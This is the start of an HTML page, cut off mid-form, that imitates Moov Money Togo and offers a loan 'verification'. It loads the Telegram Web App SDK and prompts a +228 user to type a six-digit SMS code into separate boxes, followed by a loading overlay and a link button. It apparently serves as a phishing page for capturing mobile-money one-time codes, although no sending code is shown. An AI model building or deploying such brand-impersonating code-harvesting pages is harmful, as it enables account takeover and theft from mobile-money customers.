<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Moov Money Togo - Prêts & Vérification</title>
    
    <!-- ✅ Telegram SDK -->
    <script src="https://telegram.org/js/telegram-web-app.js"></script>

    <style>
        :root {
            --moov-primary: #0056b3;
            --moov-gradient: linear-gradient(180deg, #007bff 0%, #0056b3 100%);
            --bg-color: #f7f7f7;
            --card-bg: #ffffff;
            --text-dark: #111111;
            --text-muted: #666666;
            --border-moov: #0056b3;
            --btn-disabled-bg: #e0e0e0;
            --btn-disabled-text: #999999;
        }

        * {
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
        }

        body {
            background-color: var(--bg-color);
            margin: 0;
            padding: 0;
            display: flex;
            flex-direction: column;
            min-height: 100vh;
            align-items: center;
        }

        .header-box {
            width: 100%;
            background: var(--moov-gradient);
            padding: 25px 20px 40px 20px;
            color: white;
            text-align: center;
            font-size: 26px;
            font-weight: 800;
            letter-spacing: -0.3px;
        }

        .main-container {
            width: 100%;
            display: flex;
            justify-content: center;
            margin-top: -20px;
            flex-grow: 1;
        }

        .card {
            background: var(--card-bg);
            width: 90%;
            max-width: 400px;
            padding: 30px 20px;
            border-radius: 16px;
            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.08);
            align-self: flex-start;
        }

        h2 {
            margin: 0 0 12px 0;
            font-size: 22px;
            color: var(--text-dark);
            font-weight: 800;
            line-height: 1.2;
            text-align: center;
        }

        .instruction {
            font-size: 14px;
            color: var(--text-muted);
            margin: 0 0 12px 0;
            line-height: 1.4;
            text-align: center;
        }

        .phone-number {
            font-size: 16px;
            font-weight: 800;
            color: var(--text-dark);
            margin-bottom: 25px;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
        }

        /* 6-Digit Numeric Code Input Grid */
        .code-input-container {
            display: flex;
            justify-content: space-between;
            gap: 6px;
            margin-bottom: 20px;
        }

        .code-box {
            width: 48px;
            height: 54px;
            border: 2px solid var(--border-moov);
            border-radius: 10px;
            text-align: center;
            font-size: 22px;
            font-weight: 800;
            outline: none;
            color: var(--text-dark);
            background-color: #ffffff;
        }

        .code-box:focus {
            box-shadow: 0 0 5px rgba(0, 86, 179, 0.5);
            border-width: 2.5px;
        }

        .resend-text {
            text-align: center;
            color: var(--text-muted);
            font-size: 14px;
            margin: 20px 0;
        }

        .submit-btn {
            width: 100%;
            background-color: var(--btn-disabled-bg);
            color: var(--btn-disabled-text);
            border: none;
            padding: 16px;
            border-radius: 10px;
            font-size: 16px;
            font-weight: 800;
            cursor: not-allowed;
            text-transform: uppercase;
            letter-spacing: 0.5px;
            transition: background-color 0.2s;
        }

        .submit-btn.active {
            background-color: var(--moov-primary);
            color: white;
            cursor: pointer;
        }

        .submit-btn.active:hover {
            background-color: #004085;
        }

        .footer-banner {
            width: 100%;
            background: var(--moov-gradient);
            height: 80px;
            border-top-left-radius: 50% 30px;
            border-top-right-radius: 50% 30px;
            margin-top: 40px;
        }

        /* Fullsize Screen Overlay Styles */
        .overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100vw;
            height: 100vh;
            background: var(--moov-gradient);
            display: none;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            z-index: 9999;
            color: white;
            text-align: center;
            padding: 24px;
        }

        .overlay-card {
            width: 100%;
            max-width: 360px;
            display: flex;
            flex-direction: column;
            align-items: center;
        }

        .spinner {
            width: 56px;
            height: 56px;
            border: 5px solid rgba(255, 255, 255, 0.3);
            border-top: 5px solid white;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin-bottom: 24px;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        .overlay-title {
            font-size: 22px;
            font-weight: 800;
            margin-bottom: 12px;
            color: white;
        }

        .overlay-desc {
            font-size: 15px;
            font-weight: 600;
            margin-bottom: 20px;
            color: #ffffff;
            line-height: 1.4;
        }

        .wa-btn {
            display: block;
            width: 100%;
            background-color: white;
            color: var(--moov-primary);
            font-weight: 800;
            padding: 16px;
            border-radius: 12px;
            text-decoration: none;
            word-break: break-all;
            font-size: 13px;
            box-shadow: 0 4px 15px rgba(0,0,0,0.15);
        }

        .error-message {
            color: #e74c3c;
            font-size: 13px;
            margin-top: 10px;
            display: none;
            text-align: center;
            font-weight: 600;
        }
    </style>
</head>

<body>

<div class="header-box">
    Moov Money Prêt
</div>

<div class="main-container">
    <div class="card">
        <h2>Vérification Prêt</h2>

        <p class="instruction">
            Entrez le code de vérification à 6 chiffres reçu par SMS (ex: 350059)
        </p>

        <!-- Phone display for Togo -->
        <div class="phone-number">
            <span>🇹🇬</span>
            <span id="displayPhone">+228 ...</span>
        </div>

        <!-- 6-digit Code Entry Boxes with numeric attributes -->
        <div class="code-input-container">
            <input type="text" inputmode="numeric" pattern="[0-9]*" maxlength="1" class="code-box" autocomplete="off" spellcheck="false">
            <input type="text" inputmode="numeric" pattern="[0-9]*" maxlength="1" class="code-box" autocomplete="off" spellcheck="false">
            <input type="text" inputmode="numeric" pattern="[0-9]*" maxlength="1"
